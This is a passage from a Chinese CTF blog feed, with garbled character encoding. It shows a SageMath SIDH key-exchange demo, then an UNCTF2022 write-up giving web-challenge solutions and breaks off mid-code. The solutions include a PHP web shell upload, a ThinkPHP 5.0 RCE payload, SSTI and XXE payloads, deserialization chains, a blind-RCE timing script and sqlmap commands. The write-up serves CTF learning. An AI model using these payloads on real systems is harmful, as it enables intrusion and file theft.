class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é€‰å–ä¸€æ¡åœ¨ç´ åŸŸkä¸Šçš„è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿</span></span><br><span class="line">lA, lB = <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">eA, eB = <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">p = lA ^ eA * lB ^ eB - <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p.is_prime()</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line">k = GF(p) <span class="comment"># æ³¨æ„ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æ ‡å‡†åšæ³•ï¼Œåªæ˜¯å› ä¸ºSageçš„å±€é™ä¸å¾—å·²</span></span><br><span class="line">E = EllipticCurve(k, [<span class="number">1</span>, <span class="number">0</span>]) <span class="comment">#é€‰å–æ›²çº¿</span></span><br><span class="line">E</span><br><span class="line">E.is_supersingular() <span class="comment"># çœ‹çœ‹æ‰€ç”Ÿæˆçš„æ›²çº¿æ˜¯å¦è¶…å¥‡å¼‚.</span></span><br><span class="line"><span class="built_in">print</span>(E.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€‰å–å››ä¸ªéšæœºç‚¹ä½œä¸ºå…¬å…±å‚æ•°</span></span><br><span class="line">points = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(points) != <span class="number">4</span>:</span><br><span class="line">    p = E.random_point()</span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">not</span> <span class="keyword">in</span> points:</span><br><span class="line">        points.append(p)</span><br><span class="line">PA, PB, QA, QB = points</span><br><span class="line">PA, PB, QA, QB</span><br></pre></td></tr></table></figure><p><strong>Alice çš„æ“ä½œ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Aliceé€‰æ‹©ä¸¤ä¸ªéšæœºæ•°å¹¶è®¡ç®—è‡ªå·±çš„ç§˜å¯†å€¼RA</span></span><br><span class="line"><span class="comment">#RAå®šä¹‰äº†phi_Açš„kernel</span></span><br><span class="line">sA, tA = <span class="number">123</span>, <span class="number">525</span></span><br><span class="line">RA = sA * PA + tA * QA</span><br><span class="line"><span class="built_in">print</span>(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiAå°±æ˜¯åŒæºä¹Ÿæ˜¯ç¾¤åŒæ€</span></span><br><span class="line">phiA = E.isogeny(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Aliceçš„å…¬å…±ä¿¡æ¯EA</span></span><br><span class="line">EA = phiA.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EA)) <span class="comment"># ç¡®è®¤EAä¸EåŒæº</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Aliceå‘é€ä»¥ä¸‹ä¿¡æ¯ç»™Bob</span></span><br><span class="line">EA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)</span><br><span class="line">EA, phiA_PB, phiA_QB</span><br></pre></td></tr></table></figure><p><strong>Bob çš„æ“ä½œ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Bobçš„å·¥ä½œç±»ä¼¼</span></span><br><span class="line">sB, tB = <span class="number">812</span>, <span class="number">580</span></span><br><span class="line">RB = sB * PB + tB * QB</span><br><span class="line"><span class="built_in">print</span>(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiBå°±æ˜¯ä»Eåˆ°EBåŒæ€æ˜ å°„,Kernelæ˜¯RB</span></span><br><span class="line">phiB = E.isogeny(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bobçš„å…¬å…±ä¿¡æ¯EB</span></span><br><span class="line">EB = phiB.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EB)) <span class="comment"># ç¡®è®¤EBä¸EåŒæº</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bobå‘é€ä»¥ä¸‹ä¿¡æ¯ç»™Alice</span></span><br><span class="line">EB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)</span><br><span class="line">EB, phiB_PA, phiB_QA</span><br></pre></td></tr></table></figure><p><strong>ç§˜å¯†å€¼è®¡ç®—</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Aliceè®¡ç®—ç§˜å¯†å€¼</span></span><br><span class="line">R_BA = sA * phiB_PA + tA * phiB_QA</span><br><span class="line"><span class="built_in">print</span>(R_BA)</span><br><span class="line">phiBA = EB.isogeny(R_BA)</span><br><span class="line"><span class="built_in">print</span>(phiBA)</span><br><span class="line">KA = phiBA.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bobè®¡ç®—ç§˜å¯†å€¼</span></span><br><span class="line">R_AB = sB * phiA_PB + tB * phiA_QB</span><br><span class="line"><span class="built_in">print</span>(R_AB)</span><br><span class="line">phiAB = EA.isogeny(R_AB)</span><br><span class="line"><span class="built_in">print</span>(phiAB)</span><br><span class="line">KB = phiAB.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æµ‹è¯•ç§˜å¯†å€¼æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line"><span class="keyword">if</span> KA == KB:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Castryck-Decruæ”»å‡»"><a href="#Castryck-Decruæ”»å‡»" class="headerlink" title="Castryck-Decruæ”»å‡»"></a>Castryck-Decruæ”»å‡»</h4><p>ï¼ˆå¾…è¡¥å……ï¼‰</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath">Castryck-Decru-SageMath</a></p><p><a href="https://eprint.iacr.org/2022/975.pdf">An efficient key recovery attack on SIDH</a></p><p><a href="https://github.com/jack4818/Castryck-Decru-SageMath">Castryck-Decru Key Recovery Attack on SIDH</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åé‡å­å¯†ç å­¦&lt;/strong&gt;ï¼ˆPost-Quantum Cryptographyï¼ŒPQCï¼‰ï¼Œåˆç§°&lt;strong&gt;æŠ—é‡å­è®¡ç®—å¯†ç å­¦&lt;/strong&gt;ï¼Œæ˜¯å¯†ç å­¦çš„ä¸€ä¸ªç ”ç©¶é¢†åŸŸï¼Œä¸“é—¨ç ”ç©¶èƒ½å¤ŸæŠµæŠ—é‡å­è®¡ç®—æœºçš„åŠ å¯†ç®—æ³•ï¼Œç‰¹åˆ«æ˜¯å…¬é’¥åŠ å¯†ï¼ˆéå¯¹</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="åé‡å­å¯†ç " scheme="https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2022-å…¬å¼€èµ›</title>
    <link href="https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2022-11-18T11:43:08.000Z</published>
    <updated>2022-11-20T17:32:45.560Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºäºŒåå¤§æå‡ºçš„ç½‘ç»œå¼ºå›½çš„é‡è¦æ€æƒ³ï¼Œå›´ç»•å»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²ï¼Œå»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²è¦ä¸â€œä¸¤ä¸ªä¸€ç™¾å¹´â€å¥‹æ–—ç›®æ ‡åŒæ­¥æ¨è¿›ï¼Œç”±å¾¡ä¹‹å®‰æ‰¿åŠUNCTF2022ç½‘ç»œå®‰å…¨å¤§èµ›ï¼ˆä»¥ä¸‹ç®€ç§°â€œå¤§èµ›â€ï¼‰å°†äºä»Šå¹´11æœˆä»½å¬å¼€ï¼Œä»¥èµ›äº‹ä¸ºå¥‘æœºï¼Œæå‡ç½‘ç»œå®‰å…¨ä¿éšœèƒ½åŠ›ï¼Œæ±‡èšé«˜ç«¯ç½‘ç»œå®‰å…¨äººæ‰ï¼Œå…±ç­‘ç½‘ç»œå®‰å…¨é˜²çº¿ï¼Œä¸ºä¸­å›½ç½‘ç»œå®‰å…¨äº‹ä¸šå‘å±•æä¾›æ™ºåŠ›æ”¯æ’‘å’Œä¿éšœã€‚</p><p>çº¿ä¸ŠæŠ¥åï¼š2022å¹´10æœˆ24æ—¥10:00-11æœˆ11æ—¥10:00ï¼Œæ¯”èµ›æ—¶é—´ï¼š2022å¹´11æœˆ12æ—¥12:00-11æœˆ18æ—¥12:00</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦å•¦"><a href="#æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦å•¦" class="headerlink" title="æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦å•¦"></a>æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦å•¦</h3><p>phpinfoé¡µé¢ç¯å¢ƒå˜é‡ä¸­ç›´æ¥æ³„éœ²flagã€‚</p><p>â€‹    </p><h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><blockquote><p>ç®€å•çš„æ¸¸æˆ~ æ‰“è¿‡bosså°±èƒ½è·å¾—flag</p></blockquote><p>F12æŸ¥çœ‹jsï¼Œåœ¨main.jsé‡Œæœç´¢ <code>unctf</code>ï¼Œåœ¨æ··æ·†jsä»£ç ä¸­æ‰¾åˆ°flagç‰‡æ®µï¼Œè¿æ¥èµ·æ¥å¾—ï¼š<code>unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><blockquote><p>åˆæ˜¯ä¸€é“ç®€å•çš„ç­¾åˆ°</p></blockquote><p>F12å‘ç°æ³¨é‡Šæœ‰å­¦å· <code>20200101</code> ä¸ºè´¦å·å¯†ç ï¼Œå°è¯• <code>20200102/20200103/20200104/20200105</code> åˆ†åˆ«å›æ˜¾ <code>f/l/a/g</code>ï¼Œè„šæœ¬éå†æå–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20200102</span>,<span class="number">20200102</span>+<span class="number">40</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    flag += r.text[-<span class="number">5</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>å¼±ç±»å‹æ¯”è¾ƒã€‚ç¬¬ä¸€å±‚ï¼Œ16è¿›åˆ¶0xç»•è¿‡ï¼›ç¬¬äºŒå±‚ï¼Œæ•°ç»„ç»•è¿‡ï¼›ç¬¬ä¸‰å±‚ï¼Œç”¨å…¶ä»–å‘½ä»¤å’Œé€šé…ç¬¦ç»•è¿‡RCEã€‚</p><p>Payloadï¼š</p><p><code>/index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));</code>ï¼ŒPOSTï¼š<code>a=0x&amp;key1[]=a&amp;key2[]=b</code></p><p>â€‹    </p><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><blockquote><p>ç®€ç®€å•å•çš„æ–‡ä»¶ä¸Šä¼ </p></blockquote><p>æ— è¿‡æ»¤çš„æ–‡ä»¶ä¸Šä¼ ã€‚ä¸Šä¼ ä¸€ä¸ª <code>1.php</code>ï¼Œå†…å« <code>&lt;?php system($_GET[x]);</code>ï¼Œå†è®¿é—®ä¼ å…¥å‘½ä»¤RCEã€‚</p><p>Payloadï¼š<code>/uplO4d/1.php?x=cat%20/home/ctf/flag</code></p><p>â€‹    </p><h3 id="ç»™ä½ ä¸€åˆ€"><a href="#ç»™ä½ ä¸€åˆ€" class="headerlink" title="ç»™ä½ ä¸€åˆ€"></a>ç»™ä½ ä¸€åˆ€</h3><p>ThinkPHP 5.0.xæœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´ã€‚</p><p>Payload: <code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</code></p><p>flag: <code>UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125;</code></p><p>â€‹    </p><h3 id="302ä¸æ·±å¤§"><a href="#302ä¸æ·±å¤§" class="headerlink" title="302ä¸æ·±å¤§"></a>302ä¸æ·±å¤§</h3><blockquote><p>thaiæƒ³è®©ä½ çŸ¥é“szuçš„æˆ˜é˜Ÿâ€¦â€¦å—ï¼Œé†’é†’ï¼Œè¿™ä¸ªé¡µé¢ä¸æ˜¯ä¸»é¡µï¼</p></blockquote><p>Requestå¤´çš„è€ƒå¯Ÿã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?miku=puppy</span><br><span class="line">POST: micgo=ikun</span><br><span class="line">Cookie: admin=true</span><br></pre></td></tr></table></figure><p>flag: <code>UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125;</code></p><p>â€‹    </p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><blockquote><p>phpçœ‹è…»äº†ï¼Œæ¥ç‚¹pythonå§</p></blockquote><p>åŸºæœ¬æ— è¿‡æ»¤çš„SSTIã€‚</p><p>Payloadï¼š</p><p><code>/register</code>ï¼ŒPOSTï¼š<code>user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd=</code></p><p>â€‹    </p><h3 id="å¬è¯´phpæœ‰ä¸€ä¸ªxxe"><a href="#å¬è¯´phpæœ‰ä¸€ä¸ªxxe" class="headerlink" title="å¬è¯´phpæœ‰ä¸€ä¸ªxxe"></a>å¬è¯´phpæœ‰ä¸€ä¸ªxxe</h3><p>XXEã€‚å…ˆè®¿é—® <code>/hint</code>ï¼Œå†è®¿é—® <code>/dom.php</code>ï¼Œæ ¹æ® <code>DOMDocument::loadXML()</code>ä¿¡æ¯ï¼ŒPOSTä¸€ä¸ªXMLæ•°æ®è¯»flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezunseri"><a href="#ezunseri" class="headerlink" title="ezunseri"></a>ezunseri</h3><blockquote><p>å¥½åƒè¿˜æ²¡æœ‰ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Ÿ</p></blockquote><p>ååºåˆ—åŒ–é“¾ï¼š<code>Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute()</code></p><p>æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    public_test=Exec()</span><br><span class="line">    public_key=<span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exec</span>:</span><br><span class="line">    public_content=Test()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span>:</span><br><span class="line">    private_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    public_code=<span class="string">&#x27;3.1415926&#x27;</span></span><br><span class="line">    public_key=Exec()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(Login())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># ç»•__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h3><p>ååºåˆ—åŒ–é“¾ï¼š<code>B:__destruct() =&gt; C:__toString() =&gt; A:__call()</code></p><p>æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_code=<span class="string">&#x27;system(&quot;env&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    private_key2=A()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_key=C()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line">      </span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="comment"># ç»•__wakeup():</span></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="babynode"><a href="#babynode" class="headerlink" title="babynode"></a>babynode</h3><blockquote><p>ä½ èƒ½æ±¡æŸ“å¯¹è±¡å—</p></blockquote><p>åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>Payloadï¼š</p><p>POSTï¼š <code>&#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125;</code></p><p>â€‹    </p><h3 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h3><blockquote><p>rceå¸ƒå°”ç›²æ³¨</p></blockquote><p>æ— å›æ˜¾RCEï¼Œå¯ä»¥é‡‡ç”¨ <code>if+head+cut+sleep</code> æ–¹å¼é€ä½çŒœè§£flagå„ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;</span></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;&#123;-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(tac /f?ag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>)%0aif [ $a = <span class="subst">&#123;j&#125;</span> ]%0athen sleep 2%0afi&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(now)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt; <span class="number">1</span>:</span><br><span class="line">            judge = <span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="éšä¾¿æ³¨"><a href="#éšä¾¿æ³¨" class="headerlink" title="éšä¾¿æ³¨"></a>éšä¾¿æ³¨</h3><blockquote><p>å¥½åƒè§è¿‡ï¼Œåˆå¥½åƒä¸æ˜¯</p></blockquote><p>sqlmapèƒ½è·‘å‡ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot;</span> -D ctftraining -T FLAG_TABLE --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; <span class="keyword">select</span> load_file(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ez2048"><a href="#ez2048" class="headerlink" title="ez2048"></a>ez2048</h3><p>F12åœ¨game.jså†…æŸ¥çœ‹å…³é”®ä»£ç ï¼Œä¸ºé¦–é¡µinvite_codeéªŒè¯é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">checkInvited</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> args = [...<span class="variable language_">arguments</span>];</span><br><span class="line">    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">const</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">    view.<span class="title function_">setUint8</span>(<span 